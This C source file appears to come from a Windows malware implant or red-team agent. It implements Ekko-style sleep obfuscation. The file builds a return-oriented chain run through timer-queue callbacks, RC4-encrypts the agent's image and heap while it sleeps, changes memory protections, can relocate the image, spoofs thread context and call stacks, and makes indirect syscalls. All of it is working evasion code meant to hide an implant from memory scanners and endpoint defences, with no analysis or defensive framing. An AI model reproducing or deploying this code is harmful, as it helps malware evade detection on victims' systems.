#include <Sleep.h>

FUNC PVOID FindCallFnGadget(PVOID Fn)
{
    STARDUST_INSTANCE

    PUCHAR base_address = (PUCHAR)Instance()->Modules.Ntdll;
    ULONG module_size = 0x200000;

    // Iterate through the memory of ntdll.dll
    for (ULONG offset = 0; offset < module_size; offset++)
    {
        // Check for the 'call' instruction (opcode 0xE8)
        if (MemCompare(base_address + offset, "\xE8", 1) == 0)
        {
            // Read the relative address
            LONG relative_address = *(PLONG)(base_address + offset + 1);
            ULONG target_address = (ULONG)(base_address + offset + 5 + relative_address);

            // Check if the target address matches NtContinue
            if (target_address == (ULONG)Fn)
            {
                return base_address + offset;
            }
        }
    }
    return Fn;
}

FUNC PVOID FindJmpFnGadget(PVOID Fn)
{
    STARDUST_INSTANCE

    PUCHAR base_address = (PUCHAR)Instance()->Modules.Ntdll;
    ULONG module_size = 0x200000;

    // Iterate through the memory of ntdll.dll
    for (ULONG offset = 0; offset < module_size; offset++)
    {
        // Check for the 'call' instruction (opcode 0xE8)
        if (MemCompare(base_address + offset, "\xE9", 1) == 0)
        {
            // Read the relative address
            LONG relative_address = *(PLONG)(base_address + offset + 1);
            ULONG target_address = (ULONG)(base_address + offset + 5 + relative_address);

            // Check if the target address matches NtContinue
            if (target_address == (ULONG)Fn)
            {
                return base_address + offset;
            }
        }
    }
    return Fn;
}

FUNC VOID EncryptHeap(BYTE Key[16])
{
    STARDUST_INSTANCE

    if (Instance()->Heap != Instance()->Peb->ProcessHeap)
    {
        USTRING S32Key = {0};
        USTRING S32Data = {0};
        RTL_HEAP_WALK_ENTRY Entry = {0};

        S32Key.Length = S32Key.MaximumLength = sizeof(Key);
        S32Key.Buffer = Key;
        while (NT_SUCCESS(Instance()->Win32.RtlWalkHeap(Instance()->Heap, &Entry)))
        {
            if ((Entry.Flags & 0x1) != 0 && Entry.DataSize > 0)
            {
                S32Data.Length = S32Data.MaximumLength = Entry.DataSize;
                S32Data.Buffer = (PBYTE)(Entry.DataAddress);
                Instance()->Win32.SystemFunction032((PVOID)&S32Data, (PVOID)&S32Key);
            };
        };

        MmZero(&S32Data, sizeof(S32Data));
        MmZero(&S32Key, sizeof(S32Key));
        MmZero(&Entry, sizeof(Entry));
    }
};

FUNC VOID EkkoEx(
    IN DWORD TimeOut,
    IN BYTE JmpBypass)
{
    STARDUST_INSTANCE
    NTSTATUS NtStatus = STATUS_SUCCESS;
    USTRING Key = {0};
    USTRING Img = {0};
    BYTE Rnd[16] = {0};
    CONTEXT Rop[13] = {0};
    CONTEXT RopInit = {0};
    CONTEXT OriginalCtx = {0}; // Original context for stack spoofing
    CONTEXT SpoofedCtx = {0};  // Spoofed context for stack spoofing
    HANDLE EvntTimer = {0};
    HANDLE EvntStart = {0};
    HANDLE EvntEnd = {0};
    HANDLE Queue = {0};
    HANDLE Timer = {0};
    HANDLE SpoofThd = NtCurrentThread(); // Current thread for spoofing
    DWORD Delay = {0};
    DWORD Value = {0};
    LARGE_INTEGER SleepTimeLargeInt = MillisecondsToLargeInteger(TimeOut);
    PVOID JmpGadget = {0};
    BYTE LastByte = JmpBypass == SLEEPOBF_BYPASS_JMPRBX ? 0x23 : 0xE0;
    BYTE JmpPad[] = {0xFF, LastByte};

    PVOID CallZwContinue = FindCallFnGadget(Instance()->Win32.NtContinue);
    PVOID CallZwSetEvent = FindJmpFnGadget(Instance()->Win32.NtSetEvent);

    INT Idx = 0;

#ifdef SLEEPOBF_FLOW

    PVOID NewRegion = {0};
    ULONG Offset = 0x1000;

    // Allocate new memory region
    while (TRUE)
    {
        if (!(NewRegion = Instance()->Win32.VirtualAlloc(
                  C_PTR(U_PTR(Instance()->Base.Buffer) + Offset),
                  Instance()->Base.Length,
                  (MEM_COMMIT | MEM_RESERVE),
                  PAGE_READWRITE)))
        {
            Offset += 0x1000;
            continue;
        }
        break;
    }

#endif

    /* image base and size */
    PVOID ImageBase = Instance()->Base.Buffer;
    ULONG ImageLen = Instance()->Base.Length;

    /* generate a new key */
    for (int i = 0; i < 16; i++)
    {
        Rnd[i] = RandomNumber32();
    }

    /* set key buffer and size */
    Key.Buffer = Rnd;
    Key.Length = Key.MaximumLength = sizeof(Rnd);

/* set image pointer and size */
#ifdef SLEEPOBF_FLOW
    Img.Buffer = NewRegion; /* address of your agent */
#else
    Img.Buffer = ImageBase;
#endif
    Img.Length = Key.MaximumLength = ImageLen; /* size of agent memory */
    /* create a timer queue */
    if (!NT_SUCCESS(Instance()->Win32.RtlCreateTimerQueue(&Queue)))
    {
        goto LEAVE;
    }

    /* create events for starting the rop chain and waiting for the rop chain to finish */
    if (!NT_SUCCESS(NtStatus = SysNtCreateEvent(&EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) ||
        !NT_SUCCESS(NtStatus = SysNtCreateEvent(&EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) ||
        !NT_SUCCESS(NtStatus = SysNtCreateEvent(&EvntEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)))
    {
        goto LEAVE;
    }

#ifdef SLEEPOBF_SPOOF
    /* Prepare the spoofed context */
    Instance()->Win32.NtDuplicateObject(NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &SpoofThd, THREAD_ALL_ACCESS, 0, 0);
    OriginalCtx.ContextFlags = CONTEXT_FULL;
    SpoofedCtx.ContextFlags = CONTEXT_FULL; // Copy the original context
    SpoofedCtx.Rsp -= 0x1000;
    SpoofedCtx.Rip = U_PTR(Instance()->Win32.RtlUserThreadStart + 0x28);
#endif

    /* let's start the rop part of this operation/sleep obf */
    if (NT_SUCCESS(NtStatus = Instance()->Win32.RtlCreateTimer(Queue, &Timer, Instance()->Win32.RtlCaptureContext, &RopInit, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)))
    {
        /* wait til we successfully finished calling RtlCaptureContext */
        if (NT_SUCCESS(NtStatus = Instance()->Win32.RtlCreateTimer(Queue, &Timer, CallZwSetEvent, EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)))
        {
            /* wait til we successfully retrieved the timers thread context */
            LARGE_INTEGER Timeout = MillisecondsToLargeInteger(1000);

            if (!NT_SUCCESS(NtStatus = SysNtWaitForSingleObject(EvntTimer, FALSE, &Timeout)))
            { /* we only wait for a second... */
                goto LEAVE;
            }

            /* at this point we can start preparing the ROPs and execute the timers */
            if (JmpBypass)
            {
                /* scan memory for gadget */
                if (!(JmpGadget = MmGadgetFind(
                          C_PTR(U_PTR(Instance()->Modules.Kernel32) + LDR_GADGET_HEADER_SIZE),
                          LDR_GADGET_MODULE_SIZE,
                          JmpPad,
                          sizeof(JmpPad))))
                {
                    JmpBypass = SLEEPOBF_BYPASS_NONE;
                }
            }

            for (int i = 0; i < 13; i++)
            {
                Rop[i] = RopInit;
                Rop[i].Rip = U_PTR(JmpGadget);
                Rop[i].Rsp -= sizeof(PVOID);
            }

            /* Start of Ropchain */
            OBF_JMP(Idx, Instance()->Win32.NtWaitForSingleObject);
            Rop[Idx].Rcx = U_PTR(EvntStart);
            Rop[Idx].Rdx = U_PTR(FALSE);
            Rop[Idx].R8 = U_PTR(INFINITE);
            Idx++;

#ifdef SLEEPOBF_FLOW

            OBF_JMP(Idx, Instance()->Win32.memmove);
            Rop[Idx].Rcx = U_PTR(NewRegion);
            Rop[Idx].Rdx = U_PTR(Instance()->Base.Buffer);
            Rop[Idx].R8 = U_PTR(Instance()->Base.Length);
            Idx++;
#endif

            OBF_JMP(Idx, Instance()->Win32.VirtualProtect);
            Rop[Idx].Rcx = U_PTR(ImageBase);
            Rop[Idx].Rdx = U_PTR(ImageLen);
            Rop[Idx].R8 = U_PTR(PAGE_READWRITE);
            Rop[Idx].R9 = U_PTR(&Value);
            Idx++;

#if defined(SLEEPOBF_FLOW) && defined(SLEEPOBF_ZERO_OLD_REGION)
            OBF_JMP(Idx, Instance()->Win32.RtlZeroMemory);
            Rop[Idx].Rcx = U_PTR(ImageBase);
            Rop[Idx].Rdx = U_PTR(ImageLen);
            Idx++;

            OBF_JMP(Idx, Instance()->Win32.VirtualFree);
            Rop[Idx].Rcx = U_PTR(ImageBase);
            Rop[Idx].Rdx = U_PTR(ImageLen);
            Rop[Idx].R8 = U_PTR(MEM_RELEASE);
            Idx++;
#endif

            /* Encrypt image base address */
            OBF_JMP(Idx, Instance()->Win32.SystemFunction032);
            Rop[Idx].Rcx = U_PTR(&Img);
            Rop[Idx].Rdx = U_PTR(&Key);
            Idx++;

#ifdef SLEEPOBF_SPOOF

            OBF_JMP(Idx, Instance()->Win32.NtGetContextThread)
            Rop[Idx].Rcx = U_PTR(SpoofThd);
            Rop[Idx].Rdx = U_PTR(&OriginalCtx);
            Idx++;

            OBF_JMP(Idx, Instance()->Win32.NtSetContextThread);
            Rop[Idx].Rcx = U_PTR(SpoofThd);
            Rop[Idx].Rdx = U_PTR(&SpoofedCtx);
            Idx++;
#endif

            /* Sleep    */
            OBF_JMP(Idx, Instance()->Win32.NtWaitForSingleObject);
            Rop[Idx].Rcx = U_PTR(NtCurrentProcess());
            Rop[Idx].Rdx = U_PTR(FALSE);
            Rop[Idx].R8 = U_PTR(&SleepTimeLargeInt);
            Idx++;

            /* Sys032   */
            OBF_JMP(Idx, Instance()->Win32.SystemFunction032);
            Rop[Idx].Rcx = U_PTR(&Img);
            Rop[Idx].Rdx = U_PTR(&Key);
            Idx++;

#ifdef SLEEPOBF_SPOOF
            OBF_JMP(Idx, Instance()->Win32.NtSetContextThread);
            Rop[Idx].Rcx = U_PTR(SpoofThd);
            Rop[Idx].Rdx = U_PTR(&OriginalCtx);
            Idx++;
#endif

            OBF_JMP(Idx, Instance()->Win32.VirtualProtect);
#ifdef SLEEPOBF_FLOW
            Rop[Idx].Rcx = U_PTR(NewRegion);
#else
            Rop[Idx].Rcx = U_PTR(ImageBase);
#endif
            Rop[Idx].Rdx = U_PTR(ImageLen);
            Rop[Idx].R8 = U_PTR(PAGE_EXECUTE_READ);
            Rop[Idx].R9 = U_PTR(&Value);
            Idx++;

            /* End of Ropchain */
            OBF_JMP(Idx, Instance()->Win32.NtSetEvent);
            Rop[Idx].Rcx = U_PTR(EvntEnd);
            Rop[Idx].Rdx = U_PTR(NULL);
            Idx++;

            /* execute timers */
            // Instance()->Win32.printf("%d", Idx);
            for (int i = 0; i < Idx; i++)
            {
                if (!NT_SUCCESS(Instance()->Win32.RtlCreateTimer(Queue, &Timer, CallZwContinue, &Rop[i], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)))
                {
                    goto LEAVE;
                }
            }

#ifdef SLEEPOBF_FLOW
            Instance()->Base.Buffer = NewRegion;

            FLOWER_ROPSTART_PRM prm = {0};
            prm.Func = Instance()->Win32.NtSignalAndWaitForSingleObject;
            prm.Signal = EvntStart;
            prm.Wait = EvntEnd;
            prm.Alertable = FALSE;
            prm.TimeOut = NULL;
            prm.ImgBase = ImageBase;
            prm.NewBase = NewRegion;

            /* trigger/start the rop chain and wait for it to end */
            EncryptHeap(Rnd);
            FwRopStart(&prm);
#else
            EncryptHeap(Rnd);
            SPOOF_SYSCALL(Instance()->Syscall.NtSignalAndWaitForSingleObject.wSSN, EvntStart, EvntEnd, FALSE, NULL);
#endif
        }
    }

LEAVE:
    EncryptHeap(Rnd);
#ifdef SLEEPOBF_FLOW
    FwPatchRetAddr(ImageBase, NewRegion);
#endif

    if (Queue)
    {
        SysNtClose(Queue);
    }

    if (EvntTimer)
    {
        SysNtClose(EvntTimer);
    }

    if (EvntStart)
    {
        SysNtClose(EvntStart);
    }

    if (EvntEnd)
    {
        SysNtClose(EvntEnd);
    }
}
